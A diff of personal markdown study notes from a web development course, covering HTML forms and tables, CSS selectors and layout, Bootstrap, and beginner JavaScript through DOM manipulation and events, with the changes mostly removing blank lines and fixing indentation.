@@ -33,7 +33,6 @@
 
 <br>
 
-
 #### 12. The Internet in 5 Minutes
 : the global network of networks
 : The Internet is the infra that carries stuff like - email, the web, file sharing, online gaming, streaming services
@@ -213,7 +212,6 @@
 
 <br>
 
-
 ## 4. HTML: Next Steps and Semantics
 #### 32. What Matters In This Section
 - Crucial
@@ -279,7 +277,6 @@
 
 <br>
 
-
 #### 37. Semantic Markup
 - Semantic: "relating to meaning"
 : 'what purpose or role does that HTML element have?'
@@ -288,7 +285,6 @@
 - no semantics: crawling is hard, less friendlier to other apps, less accessible, and easier to work on together
 
 <br>
-
 
 #### 38. Playing with Semantic Elements
 - Instead of DIVs... Use more specific elements like
@@ -353,8 +349,6 @@
 
 <br>
 
-
-
 ## 5. HTML: Forms & Tables
 #### 41. What Matters In This Section
 - Crucial
@@ -404,11 +398,7 @@
         </tr>
       </table>
 
-
-
-
 <br>
-
 
 #### 45. Tables - Thead, Tbody, and Tfoot Elements
 - **<tbody>**: encapsulates a set of table rows, indicating that they comprise the body of the table
@@ -425,7 +415,6 @@
   
 <br>
 
-
 #### 47. Form Element
 - The <form> element itself is a shell or a container that doesn't have any visual impact
 - We then fill the from with a collection of inputs, checkboxes, buttons, etc.
@@ -438,9 +427,6 @@
 - form groups together input
 
 <br>
-
-
-
 
 #### 48. Common Input Types
 - **<input>**
@@ -500,8 +486,7 @@
         <input type = "text" name="search_query">
         <button>Click Me!</button>
       </form>
-
-    
+  
 <br>
 
 #### 53. Radio Buttons, Checkboxes & Selects
@@ -527,7 +512,6 @@
                 <option value="veg">Vegetarian</option>
                 <option value="steak">Steak</option>
             </select>
-
 
 <br>
 
@@ -584,11 +568,9 @@
 
 <br>
 
-
 #### 59. What is CSS?
 - What is it? : CSS is a lanaguage for describing how documents are presented visually - how they are arranged and styled
 - What does it stand for? : 'Cascading Style Sheets'
-
 
 - CSS Rules
 : (almost) everything you do in CSS follows this basic pattern
@@ -613,13 +595,11 @@ ex. # select every other text input
 
 <br>
 
-
 #### 61. Including Styles Correctly
 - Including Styles
 1. Inline Styles : You can write your styles directly inline on each element, but this is **NOT A GOOD IDEA** for most of the time (hard to edit and share the styles)
 2. The <STYLE> Element: You can write your styles inside of a <style> element, this is easy, but it makes it impossible to share styles between documents. **Not recommended either**
 3. External StyleSheet: Write your styles in a .css file then include it using a <link> in the head of the html doc. **Recommended!**
-
 
 - ex. <head>
         <title>Forms Demo</title>
@@ -674,7 +654,6 @@ ex. rgb (0,0,0) ~> black
 
 <br>
 
-
 #### 66. Common Text Properties
 - ex. text-align, font-weight, text-decoration, line-height, letter-spacing
 
@@ -705,7 +684,6 @@ ex. rgb (0,0,0) ~> black
     ex. font family: Gill Sans Bold, sans-serif;
     ~> Gill Sans Bold as the first choice, if there's not, any other sans-serif family as the Second choice!
 
-
 <br>
 
 ## 7. The World of CSS Selectors
@@ -717,7 +695,6 @@ ex. rgb (0,0,0) ~> black
 : Descendent Selector
 : CSS Specificity
 
-
 - Important
 : Adjacent Selector
 : Direct Descendent Selector
@@ -726,7 +703,6 @@ ex. rgb (0,0,0) ~> black
 : Pseudo Classes
 
 <br>
-
 
 #### 70. Element & Universal Selectors
 - Universal Selector : Select everything!
@@ -784,7 +760,6 @@ ex. h1 + p {
       color: red;
     }
 
-
 - Direct Child
 : Select only the <li>'s that are direct children of a <div> element
 ex. div > li {
@@ -814,7 +789,6 @@ ex. section.post {
 - other ways : ex. *= ~> "including", $= ~> "ending with"
 
 <br>
-
 
 #### 76. Pseudo Classes
 - keyword added to a selector that specifies a special **state** of selected element(s)
@@ -854,9 +828,6 @@ ex. section.post {
 
 <br>
 
-
-
-
 #### 77. Pseudo Elements
 - Keywords added to a selector that lets you style a particular part of selected element(s)
 - ex. ::after
@@ -870,8 +841,6 @@ cf. pseudo-classes:  specifies a special state of selected element(s)
 - ex. flask symbol ~> in experiment, should not be used in production
 
 ex. :: selection {}: the style applies to  wherever you select
-
-
 
 <br>
 
@@ -925,7 +894,6 @@ ex. p {
 
 <br>
 
-
 #### 82. CSS Inheritance
 - ex. when body is set to purple, h1 inside the body gets purple too
 ~> in Chrome Dev Tool, you can see that the property is 'inherited from body'
@@ -952,7 +920,6 @@ ex. p {
 : Border Radius
 
 <br>
-
 
 #### 84. Box Model: Width & Height
 - Content (Width and Height) < Padding < Border < Margin
@@ -1007,9 +974,7 @@ ex. top | right | bottom | left
 - Setting the body margin to be zero
 ~> pretty common
 
-
 <br>
-
 
 #### 88. The Display Property
 - "Display" Property
@@ -1052,7 +1017,6 @@ ex. h1: block element, and span: inline element
 
 <br>
 
-
 #### 91. CSS Units: rems
 - problem with em ~> depending on the parent element's size
 ~> ex. nested list: fonts get larger and larger or smaller and smaller
@@ -1066,10 +1030,7 @@ ex. html {
       font-size: 10px;
     }
 
-
-
 <br>
-
 
 ## 9. Other Assorted Useful CSS Properties
 #### 92. What Matters in This Section
@@ -1177,11 +1138,7 @@ ex. background: url(~) no-repeat;
 - make sure that the order is correct
 - you can have multiples images for background too
 
-
-
 <br>
-
-
 
 #### 99. Google Fonts Is Amazing
 - https://fonts.google.com/
@@ -1192,7 +1149,6 @@ ex. background: url(~) no-repeat;
 <br>
 
 #### 100. Photo Blog CodeAlong 
-
 - calc()
 - note. when you add elements in different lines, **"white space"** kicks in and it can be a problem!
 - with Flexbox it won't be a problem!
@@ -1200,7 +1156,6 @@ ex. background: url(~) no-repeat;
 <br>
 
 #### 102. What Matters In This Section
-
 - Crucial
 : Media Queries
 : FOCUS ON CONCEPTS, NOT MEMORIZING THE PROPERTIES!
@@ -1229,7 +1184,6 @@ ex. background: url(~) no-repeat;
 ~> turn on the flexbox properties
 
 - main axis (x) and cross axis (y)
-
 
 - flex-direction ~> lets you change the main axis direction
 ex. flex-direction: row; is the default
@@ -1261,7 +1215,6 @@ ex. justify-content: space-evenly;
 - nowrap / wrap / wrap-reverse!
 
 <br>
-
 
 #### 107. Align Items
 - How to align itmes along the cross axis
@@ -1301,17 +1254,12 @@ ex. justify-content: space-evenly;
 <br>
 
 #### 111. Responsive Design & Media Queries
-
 1. The Problem
 : as mobile devices and tablets became wildly available, developers had a problem...
 : how do we create websites that look good on all screen sizes?
 
 2. One Approach
 : early on, it was common to create separate stylesheets for different devices, or completely different websites for each size
-
-
-
-
 
 3. Enter Responsive
 : these days, we typically create ONE website and stylesheet that is able to respond to different device sizes and features
@@ -1342,25 +1290,16 @@ ex. justify-content: space-evenly;
           }
       }
 
-
 <br>
-
 
 #### 113. Building a Responsive Nav
 - no standard px size for different media, but there are references
 
-
-
-
 <br>
-
-
-
 
 ## 11. Pricing Panel Project
 #### 114. Pricing Panel CodeAlong Pt.1
 - CodePen!
-
 
 - CSS Rest: meyerweb.com/eric/tools/css/reset/
 ~> copy and paste in the c ss file for the starting point!
@@ -1368,12 +1307,9 @@ ex. justify-content: space-evenly;
 
 - building mobile version first then desktop version
 
-
 <br>
 
-
 ## 12. CSS Framework: Bootstrap
-
 #### 120. What Matters In This Section
 - Crucial
 : WTF is Bootstrap
@@ -1399,14 +1335,6 @@ ex. justify-content: space-evenly;
 1. Components
 : Bootstrap gives us access to a bunch of  pre-built components that we can incorporate into our own websites
 
-
-
-
-
-
-
-
-
 2. Grid System
 : Bootstrap also comes with a Grid System, which helps us construct our own custom, responsive layouts.
 
@@ -1424,12 +1352,10 @@ ex. justify-content: space-evenly;
 
 - as of now, version is v.4.5
 
-
 - some components require JS
 ~> include at the end of body
 
 - in the real application, downloading the css file is recommended ~> to make sure that the file is pristine
-
 
 - mostly we access Bootstrap by classes
 
@@ -1445,9 +1371,7 @@ ex. justify-content: space-evenly;
 <br>
 
 #### 123. Bootstrap Buttons
-
 - using btn classes
-
 
 - "semantic"colors
 : any website will have different color palette for their own primary, secondary, info, ... uses!
@@ -1467,9 +1391,6 @@ ex. justify-content: space-evenly;
 : "bg-info" ~> background color
 
 <br>
-
-
-
 
 #### 125. Badges, Alerts, & Button Groups
 - More components!
@@ -1500,13 +1421,9 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 
 - if you add "alert-dismissible fade show" class to the div, it fades out and the x goes to top right.
 
-
 <br>
 
-
-
 #### 126. Intro to BS Grid
-
 - NOTE ~> works ONLY in a container!
 - you have to create a row, using the class of row ~> typically div, but could be section or something else
 
@@ -1514,18 +1431,9 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 - if wanting equal widths, you can just assign class="col", instead of specifying the no.
 ~> <div class="row">
 
-
 - every row in BS has 12 units in space
 
-
-
-
-
-
 <br>
-
-
-
 
 #### 127. Responsive Bootstrap Grids
 - ex. col-md-6: after md breakpoint and up, the column should take 6 units. Everything below, the column takes 12 units
@@ -1537,7 +1445,6 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 <br>
 
 #### 128. Useful Grid Utilities
-
 - Bootstrap uses Flexbox
 ~> can check by inspecting, and see that the class="row" already has a setting of display:flex
 
@@ -1603,7 +1510,6 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 - Border
 : note. cannot change the width
 
-
 - Spacing
 : Margin (m) and Padding (p)
 : sides - t, b, l, r, x, y, blank
@@ -1618,7 +1524,6 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 <br>
 
 #### 133. A Mixed Bag of Other Bootstrap Stuff
-
 - Cards: pretty commonly used
 : can mix-and-match
 
@@ -1629,14 +1534,12 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 
 - Dropdowns
 
-
 - Spinner
 
 - Progress
 
 - Modal
 : popup
-
 
 <br>
 
@@ -1653,7 +1556,6 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 <br>
 
 #### 141. What Matters In This Section
-
 - Crucial
 : Understanding the role of JavaScript
 : JavaScript Numbers
@@ -1662,18 +1564,12 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 : Booleans
 : Variable Naming
 
-
 <br>
 
 #### 142. Why JavaScript is Awesome
 - reference - https://codepen.io/ste-vg/details/GRooLza
 
-
-
 <br>
-
-
-
 
 #### 143. Primitives & The Console
 - Steps
@@ -1708,9 +1604,7 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 : Loop means that the console does not stop and rather loops
 : REPL(read-eval-print loop) 또는 인터랙티브 톱레벨(interactive toplevel), 랭기지 셸(language shell)은 단일 사용자의 입력(예: 단일 식)을 취하고 이를 평가(실행)하고 결과를 사용자에게 반환시키는 단순한 상호작용 컴퓨터 프로그래밍 환경이다. REPL 환경으로 작성된 프로그램은 구간마다 실행된다
 
-
 <br>
-
 
 #### 144. JavaScript Numbers
 - JS has one number type
@@ -1729,8 +1623,6 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 : PEMDAS (Parentheses, Exponents, Multiplication, Division, Addition, and Subtraction)
 
 <br>
-
-
 
 #### 145. WTF is NaN
 - Nan: Not A Number, and is a numeric value that represents something that is... not a number
@@ -1760,11 +1652,7 @@ ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
 ~> however, totalChickens does not change with the change in numHens or numRoosters
 ~> it is just a snapshot in time
 
-
-
 <br>
-
-
 
 #### 148. Updating Numbers
 - ex. let score = 0;
@@ -1797,18 +1685,15 @@ ex. const minHeightForRide = 60;
 ex. let isLoggedIn = true;
 ex. let gameOver = false;
 
-
 - Variables can change types!!
 
 ex. let numPuppies = 23; // Number
 ex. numPuppies = false; // Now a Boolean
 ex. numPuppies = 100; // Back to Number
 
-
 <br>
 
 #### 151. Variable Naming and Conventions
-
 - Hard Rules
 : no space
 : no start with number
@@ -1830,12 +1715,9 @@ ex. userLogIn
 ex. isGameOver is better than
 ex. Game
 
-
 <br>
 
-
 ## 15. JavaScript Strings and More
-
 #### 152. What Matters in This Section
 - Crucial
 : String Basics
@@ -1849,7 +1731,6 @@ ex. Game
 
 <br>
 
-
 #### 153. Introduction to Strings
 - Strings: 'strings' of characters
 : Strings are another primitive type in JavaScript. They represent text, and must be wrapped in quotes
@@ -1862,9 +1743,7 @@ ex. let animal = 'Dumbo Octopus'; //Single quotes too
 
 : mix them only when a string need to wrap another
 
-
 <br>
-
 
 #### 154. Indices & Length
 - ex. let animal = "Dumbo Octopus"
@@ -1878,7 +1757,6 @@ ex. let animal = 'Dumbo Octopus'; //Single quotes too
 <br>
 
 #### 155. String Methods
-
 - Methods are built-in actions we can perform with individual strings
 - they help us do things like:
 ~> searching within a string
@@ -1898,8 +1776,6 @@ cf. "asdf".length
       ~> "MEOWW"
       ~> does not change the original variable
 
-
-
 - ex. '     he    '.trim() ~> 'he'
 
 - you can also chain methods!
@@ -1909,15 +1785,11 @@ ex. '     hello again!!!!!     '.trim().toUpperCase() ~>'hello again!!!!!!'
 
 <br>
 
-
-
-
 #### 156. String Methods w/Arguments
 - Syntax
 : thing.method(arg)
 
 ~> some methods accept **arguments** that modify their behavior. Think of them as inputs that we can pass in, we pass these args inside of the parentheses
-
 
 - ex. indexOf
   ex. let tvShow = 'catdog';
@@ -1946,16 +1818,13 @@ ex. '     hello again!!!!!     '.trim().toUpperCase() ~>'hello again!!!!!!'
   ex. 'lol'.repeat(3) // 'lollollol'
   ex. 'lol'.repeat(0) // empty string
 
-
 <br>
-
 
 #### 157. String Template Liters - SUPER USEFUL
 - Template Literal
 : Template Literal is strings that allow embedded expressions, which will be evaluated and then turned into a resulting string!
 
 ex. `I counted ${3+4} sheep`; //  "I counted 7 sheeps"  
-
 
 : we use back-ticks (usually above tab), NOT single quotes!
 
@@ -1996,7 +1865,6 @@ ex. Math.ceil(3.99)//4
 
 - in Console, you can type Math and can see properties and methods contained in that
 
-
 - Random Numbers: Math.random() gives a random decimal b/w 0 and 1 (non-inclusive:  not including 1)
 
 - Random Integers
@@ -2012,14 +1880,10 @@ ex. const step3 = Math.floor(step2)+ 1;
 
 ~> can manipulate numbers to get ranges needed
 
-
 <br>
 
-
 ## 16. JavaScript Decision Making
-
 #### 160. What Matters In This Section
-
 - Crucial
 : Comparison Operators
 : Running JavaScript From a File
@@ -2032,15 +1896,11 @@ ex. const step3 = Math.floor(step2)+ 1;
 <br>
 
 #### 161. Decision Making With Code??
-
 - Boolean Logic: making decision w/code
-
 
 <br>
 
-
 #### 162. Comparison Operators
-
 : > //greater than
 : < // less than
 : >= // greater than or equal to
@@ -2057,8 +1917,6 @@ ex. 'a' < 'b'; ~>true
 ex. 'A' < 'b'; ~>true
 
 <br>
-
-
 
 #### 163. Equality: Triple vs. Double Equals
 - == (double equal)
@@ -2079,13 +1937,9 @@ ex. 0 === ''; //false
 
 - So try to use *triple equals* until you become a professional software engineer
 
-
-
 <br>
 
 #### 164. Console, Alert, & Prompt
-
-
 - console.log()
 : prints arguments to the console
 : (we need this if we're going to start working with files!)
@@ -2097,7 +1951,6 @@ ex. console.log("HELLO")
 
 - ex. alert("Hi There!")
 ~> pop-up
-
 
 - ex. prompt("please enter a number")
 ~> also a pop-up
@@ -2120,10 +1973,8 @@ ex. console.log("HELLO")
 
 <br>
 
-
 #### 166. If Statements
 - Conditional Statements: making decisions with codes
-
 
 1. If Statement
 : only runs code if given condition is met
@@ -2171,8 +2022,6 @@ ex. else
         console.log("PASSWORD TOO SHORT! MUST BE 6+ CHARACTERS!"));
       }  
 
-
-
 <br>
 
 #### 170. Truth-y and False-y Values
@@ -2194,16 +2043,10 @@ ex. else
 - Logical Operators
 : combining expressions
 
-
-
 - AND: must be true on both sides, for the entire thing to be true
 ex. 1<=4 && 'a' === 'a' ~> true
 
-
 <br>
-
-
-
 
 #### 172. Logical OR
 - OR: if one side it true the entire thing is true
@@ -2215,8 +2058,6 @@ ex. 1<=4 && 'a' === 'a' ~> true
 ex. !('a' === 'b') ~> true
 
 <br>
-
-
 
 ## 17. JavaScript Arrays
 #### 174. What Matters In This Section
@@ -2233,9 +2074,7 @@ ex. !('a' === 'b') ~> true
 
 : Multi Dimensional Arrays
 
-
 <br>
-
 
 #### 175. JS Arrays
 - Arrays: Ordered collection of values
@@ -2263,7 +2102,6 @@ ex. let combo = ['anchovies', 1];
 <br>
 
 #### 177. Push AND Pop
-
 #### 178. Shift AND Unshift
 - Push: add to end
 - Pop: remove from end
@@ -2272,10 +2110,8 @@ ex. let combo = ['anchovies', 1];
 
 <br>
 
-
 #### 179. Concat, indexOf, includes & reverse
 - More Methods
-
 : concat - merge arrays
 ex. const array1 = ['a','b','c']
 ex. const array2 = ['d','e','f']
@@ -2341,11 +2177,7 @@ ex. myEggs.push('purple']);
 
 ex. myEggs = ['blue','pink'] // NO! as the reference is being forced to be changed
 
-
 <br>
-
-
-
 
 #### 183. Multi-Dimensional Arrays
 - Nested Arrays
@@ -2361,14 +2193,10 @@ ex. const boar = [
 ## 18. JS Object Literals
 #### 184. What Matters In This Section
 - Crucial
-
 : Creating and Working with Object Literals
-
-
 : Nesting Arrays and Objects
 
 <br>
-
 
 #### 185. Introducing Object Literals
 - JS Objects: our second data structure
@@ -2392,9 +2220,7 @@ ex. const fitbitData = {
 
 - also points at the memory like arrays
 
-
 <br>
-
 
 #### 187. Accessing Data Out of Objects
 - ex. chicken['species'] ~> 'Silkie'
@@ -2410,7 +2236,6 @@ ex. const fitbitData = {
 <br>
 
 #### 188. Modifying Objects
-
 - ex. chicken.lastName = 'Hemsworth';
 
 <br>
@@ -2447,16 +2272,9 @@ ex. const fitbitData = {
           }
       }
 
-
-
-
 <br>
 
-
-
-
 ## 19. Repeating Stuff With Loops
-
 #### 190. What Matters In This Section
 - Crucial
 : For Loops
@@ -2466,12 +2284,10 @@ ex. const fitbitData = {
 
 : Iterating Arrays
 
-
 - Important
 : Nested Loops
 
 - Nice To Have
-
 : Iterating Objects
 
 <br>
@@ -2501,15 +2317,12 @@ ex. for (let i=1; i<=10; i++) {
 <br>
 
 #### 194. Looping Over Arrays 
-
 - ex. const animals = ['lions','tigers','chimpanzees'];
   ex. for (let i=0; i<animals.length; i++) {
           console.log(i, animals[i]);
       }
 
 <br>
-
-
 
 #### 196. Another Loop: The While Loop
 - ex. let num = 0;
@@ -2523,7 +2336,6 @@ ex. for (let i=1; i<=10; i++) {
           guess = prompt("enter the secret code...");
       }
   ex. consolg.log("got it!");
-
 
 <br>
 
@@ -2557,7 +2369,6 @@ ex. for (let i=1; i<=10; i++) {
           console.log(char);
       }
 
-
 <br>
 
 #### 200. Iterating Over Objects
@@ -2576,10 +2387,6 @@ ex. for (let i=1; i<=10; i++) {
    => gives you an array made up of values
    **Object.entries(object_name);**
    => Nested arrays of key value pairs
-  
-     
-    
-
 
 ~> cf. for ... in for iterable arrays gives you back only the indices
 
@@ -2604,14 +2411,12 @@ ex. for (let i=1; i<=10; i++) {
 <br>
 
 #### 205. Our Very First Function
-
 - 2 Step Process: (1) Define, (2)Run
 
 1. Define
 ex. function funcName() {
       //do something
     }
-
 
 2. Run
 ex. funcName(); //run once
@@ -2621,7 +2426,6 @@ ex. funcName(); //run again
 <br>
 
 #### 206. Argument Intro
-
 - ex. function greet(firstName){
           console.log(`Hello ${person}`);
       }
@@ -2644,9 +2448,7 @@ ex. funcName(); //run again
 
 <br>
 
-
 #### 208. The Return Keyword
-
 - Return: Built-in Methods **return** values when we call them and we can store those values somewhere
 
 : return actually stops the execution of function!
@@ -2700,26 +2502,10 @@ ex. funcName(); //run again
 
 <br>
 
-
-
-
 #### 212. Lexical Scope
 - nested function has access to variables defined in the parental functions
 
-
-
-
-
-
-
-
-
-
-
-
-
 <br>
-
 
 #### 213. Function Expressions
 - Ways of defining functions...
@@ -2741,7 +2527,6 @@ ex. sumUp(a,b);
 
 <br>
 
-
 #### 214. Higher-Order Functions
 - Higher-order functions: functions that operate on or with other functions
 : they can accept other functions as arguments, and return a function
@@ -2758,22 +2543,10 @@ ex. sumUp(a,b);
 
       callTwice(rollDice)
 
-
-
-
-
-
-
-
-
-
-
 <br>
 
 #### 215. Returning Functions
-
 - returning a function inside a function
-
 
 - ex. function makeBetween(min,max){
           return function(num){
@@ -2782,9 +2555,6 @@ ex. sumUp(a,b);
     }
       const isBetween = makeBetween(1,5);
       isBetween(3);
-
-
-
 
 <br>
 
@@ -2812,8 +2582,6 @@ ex. sumUp(a,b);
         }
       }
 
-      
-
 - cf. in Python,
   ex. class Product:
           def __init__(self, name, price):
@@ -2823,9 +2591,6 @@ ex. sumUp(a,b);
               print("Hi this is "+ self.name +"which costs $ "+ self.price)
       soup = Product("soup",3.99)
       soup.myfunc()
-
-
-
 
 <br>
 
@@ -2849,12 +2614,9 @@ ex. sumUp(a,b);
       ex. prompt() == window.prompt ()
       ~> so soup() == window.soup() and cuz window object does not have 'name' and 'product' info, it will not return the same
 
-
 <br>
 
 #### 218. Using Try / Catch
-
-0
 - ex. try {
         //if the following could result in any error
         hello.toUpperCase();
@@ -2863,35 +2625,18 @@ ex. sumUp(a,b);
         console.log("error");
       }
 
-
-
-
-
 - can handle errors
 - can make sure that the code keeps running even after an error occured 
 
 <br>
 
-
-
 ## 22. Callbacks & Array  Methods
-
 #### 219. What Matters in This Section
-
-
-
-
-
-
-
-
-
 - Crucial
 : ForEach
 : Map
 : Arrow Functions
 : Filter
-
 
 - Nice To Have
 : Some & Every
@@ -2932,7 +2677,6 @@ ex. sumUp(a,b);
 ~> with the advent of for ... of => for (let el of iterables) {} (newer syntax) forEach is being less popular
 ~> anonymous function used only for that specific use, once!
 
-
 - array callback methods ~> the methods which expect functions
 
 <br>
@@ -2948,9 +2692,6 @@ ex. sumUp(a,b);
       })
 
 <br>
-
-
-
 
 #### 223. Introduction to Arrow Functions
 - Arrow Func's : Syntatically compact alternative to a regular function expression
@@ -3059,8 +2800,6 @@ ex. let movies = [
       ...
     ]
 ex. const goodMovies = movies.filter (m => m.score>=90)
-
-
 ~> often we combine map and filter
 
 ex. const goodMoviesList = goodMovies.map(m => m.title)
@@ -3075,7 +2814,6 @@ ex. const goodMoviesList = movies
 <br>
 
 #### 228. Some & Every Methods
-
 - Both of them return boolean!
 
 - Every
@@ -3109,7 +2847,6 @@ ex. words.some(word => word.includes('cake') ); //true
 : Executes a reducer function on each element of the array, **resulting in a single value** !!!!!
 ~> two parameters!
 
-
 ex. //Summing An Array
 ex. [3,5,7].reduce((accumulator, currentValue) => {
         return accumulator + currentValue;
@@ -3117,7 +2854,6 @@ ex. [3,5,7].reduce((accumulator, currentValue) => {
 ex. ~> callback   | accumulator | curentValue | return
        first call | 3           | 5           | 8
        second call| 8           | 7           | 15
-
 
 ~> can use it for calculations and comparisons and so on
 
@@ -3180,8 +2916,6 @@ ex. function multiply(a,b=2) {
 
 <br>
 
-
-
 #### 233. Spread in Function Calls
 - Spread
 : Spread syntax allows an iterable such as an array to be **expanded** in places where zero or more arguments (for function calls) or elements (for array literals) are expected,
@@ -3199,8 +2933,6 @@ ex. //Same as calling:
 <br>
 
 #### 234. Spread with Array Literals
-
-
 - Create a new array using an existing array. Spreads the elements from one array into a new array.
 - ex. const nums1 = [1,2,3];
   ex. const nums2 = [4,5,6];
@@ -3234,8 +2966,6 @@ ex. // {legs:4, family: 'Falidae', genus:'Panthera'}
 ex. const catDog = {...feline, ...canine );
 ex. // {legs:4, family:'Caninae',furry:true}
 
-
-
 <br>
 
 #### 236. Rest Params
@@ -3246,8 +2976,6 @@ ex. // {legs:4, family:'Caninae',furry:true}
   ~> does not have array methods like push/pop
 : contains all the arguments passed to the function
 : **not available** inside of arrow func. (thus use rest params!)
-
-
 
 : ex. function sumAll() {
           let total = 0;
@@ -3272,7 +3000,6 @@ ex. function summation() {
           return arguments.reduce((total,el)=> total+el)
     }
 ~> does NOT work as arguments is not an array and cannot have an array method
-
 
 - THIS IS WHERE **REST PARAMS** COMES INTO PLAY!
 - Rest Params
@@ -3312,9 +3039,7 @@ ex. function raceResults(gold,...everyoneElse){
   ex. gold; // 182310293123
   ex. others; //[190482094,129033,18441,12933,1923]
 
-
 <br>
-
 
 #### 238. Destructuring Objects
 - more common than destructuring arrays, as it does not have anything to do with the order!
@@ -3336,14 +3061,11 @@ ex. function raceResults(gold,...everyoneElse){
 - and to set default value,
   ex. const {first, last, team = 'JPMorgan'} = runner;
 
-
 <br>
-
 
 #### 239. Destructuring Params
 - Param Destructuring
 : we can destructure the values that are passed into the function as parameters
-
 
 - ex. const fullName = ({first, last}) => {
         return  `${first} ${last}`
@@ -3353,22 +3075,17 @@ ex. function raceResults(gold,...everyoneElse){
         last: "Kipchoge"
       }
 
-
 - ex. fullName(runner); // "Eliud Kipchoge"
 
 ~> most frequently used with objects!
 
 - ex. movies.filter(({score}) => score >=90);
 
-
-
 <br>
-
 
 ## 24. Introducing the World of DOM
 #### 240. What Matters In This Section
 - Crucial
-
 : Intro to the DOM
 : querySelector
 : getElementByid
@@ -3384,8 +3101,6 @@ ex. function raceResults(gold,...everyoneElse){
 <br>
 
 #### 241. Introducing DOM
-
-
 - DOM
 : Document Object Model
 
@@ -3396,9 +3111,6 @@ ex. function raceResults(gold,...everyoneElse){
 
 <br>
 
-
-
-
 #### 242. The Document Object
 - a part of loading a webpage involves..
 ~> HTML + CSS go in..
@@ -3407,13 +3119,10 @@ ex. function raceResults(gold,...everyoneElse){
 
 - console: type  console.dir(document) and can take a look into it
 
-
 - Document
-
 : the document object is our entry point into the world of the DOM. it contains representations of all the content on a page, plus tons of useful methods and properties
 
 ~> created automatically by a page based on the contents in the page.
-
 
 - CodeAlong
 : "selecting" codes
@@ -3430,9 +3139,6 @@ ex. function raceResults(gold,...everyoneElse){
 ~> thus, you can manipulate a lot using the Document Object!
 
 <br>
-
-
-
 
 #### 243. getElementById
 - 1. Select
@@ -3454,21 +3160,20 @@ ex. function raceResults(gold,...everyoneElse){
 
   <br>
 
-  #### 244. getElementsByTagName & className
-  - ex. const allImages = document.getElementsByTagName('img')
-    ~> returns the **"HTML Collection"**
+#### 244. getElementsByTagName & className
+- ex. const allImages = document.getElementsByTagName('img')
+  ~> returns the **"HTML Collection"**
 
-    ex. for(let image of allImages){
-            console.log(image.src);
-        }
-  
-  - HTML Collection
-  : looks like an array but it is not an array
-  : though allImages[index], allImages.length, and For ... Of can be used
-  : but array methods are not applicable to this
-  : it is a collection of **elements**
-  : it is the most general base class from which all element objects (that represent elemtns) in a Document inherit. It only has methods and properties common to all kinds of elements, and more specific classes inherit from Element.
+  ex. for(let image of allImages){
+          console.log(image.src);
+      }
 
+- HTML Collection
+: looks like an array but it is not an array
+: though allImages[index], allImages.length, and For ... Of can be used
+: but array methods are not applicable to this
+: it is a collection of **elements**
+: it is the most general base class from which all element objects (that represent elemtns) in a Document inherit. It only has methods and properties common to all kinds of elements, and more specific classes inherit from Element.
 
 <br>
 
@@ -3490,7 +3195,6 @@ ex. document.querySelector('img:nth-of-type(2)')
 ex. document.querySelector('a[title="Java"]')
 
 <br>
-
 
 #### 246. innerHTML, textContent,  & innerText
 - there are so many! you can use
@@ -3515,7 +3219,6 @@ ex. document.querySelector('a[title="Java"]')
 ~> nextSibling
 ~> previousSibling
 
-
 - innerText & textContent
 : texts inside
 
@@ -3523,8 +3226,6 @@ ex. document.querySelector('p').innerText = 'lololol'
 ~> changed the content!
 
 - textContent=> shows ALL the contents(ex.hidden)
-
-
 
 - innerHTML: shows the entire content including the HTML elements
 ~> useful when updating the contents
@@ -3552,16 +3253,15 @@ ex. document.querySelector('h1').innerHTML = '<i>jadlkfjlka</i>'
 
   <br>
 
-  #### 248. Changing Styles
-  
-  - ex. const h1 = document.querySelector('h1');
-    ex. h1.style
+#### 248. Changing Styles
+- ex. const h1 = document.querySelector('h1');
+  ex. h1.style
 
-    ~> .style returns the CSSStyleDeclaration 
-    ~> note. in CSS, we use '-' ex. text-align
-       vs. in JS, '-' does not work and instead, camelCase is used ex.textAlign
+  ~> .style returns the CSSStyleDeclaration 
+  ~> note. in CSS, we use '-' ex. text-align
+      vs. in JS, '-' does not work and instead, camelCase is used ex.textAlign
 
-    ~> but!! the object only contains *inline* styles specified
+  ~> but!! the object only contains *inline* styles specified
 
 - Thus, unless we use in-line styles, the object does not contain the styles we specified in a separate css file, but we can still  **manipulate** the styles using this specific object!
 
@@ -3585,7 +3285,6 @@ ex. document.querySelector('h1').innerHTML = '<i>jadlkfjlka</i>'
 
  ~> can be annoying to go through multiple steps if you don't want to override the current classes
 
-
 - Thus use sth called  *classList*
   ex. h2.classList
 
@@ -3598,14 +3297,9 @@ ex. document.querySelector('h1').innerHTML = '<i>jadlkfjlka</i>'
 
   ex. h2.classList.toggle('purple')
 
-
 <br>
 
-
 #### 250.Traversing Parent/Child/Sibling
-
-
-
 - could traverse among elements using relationships!
   ex.const firstBold = document.querySelector('b')
   ex. firstBold
@@ -3622,13 +3316,9 @@ ex. document.querySelector('h1').innerHTML = '<i>jadlkfjlka</i>'
 
 - trasversing siblings!
   ~> .nextSibling / .previousSibling: gives you back the corresponding node (a lot of cases, \n text nodes
-
-  
   ~> .nextElementSibling / .previousElementSibling: gives you back the element! 
 
-
 <br>
-
 
 #### 251. Append & AppendChild
 - creating new elements from scratch and appending to the page
@@ -3670,7 +3360,6 @@ ex. document.querySelector('h1').innerHTML = '<i>jadlkfjlka</i>'
     ex. h3.innerText = 'I am h3'
     ex. h1.after(h3)
 
-
 <br>
 
 #### 252. removeChild & remove
@@ -3686,10 +3375,7 @@ ex. firstLi.remove()
 
 <br>
 
-
-
 #### 253. Pokemon Sprites Demo
-
 - Reference code available!
 
 <br>
@@ -3752,11 +3438,9 @@ ex. firstLi.remove()
           alert('you clicked the h1 !')
       }
 
-
 <br>
 
 #### 258. addEventListener
-
 - the best Option!
 
 - addEventListener
@@ -3780,9 +3464,7 @@ ex. firstLi.remove()
 
 <br>
 
-
 #### 260. Events & The Keyword "This"
-
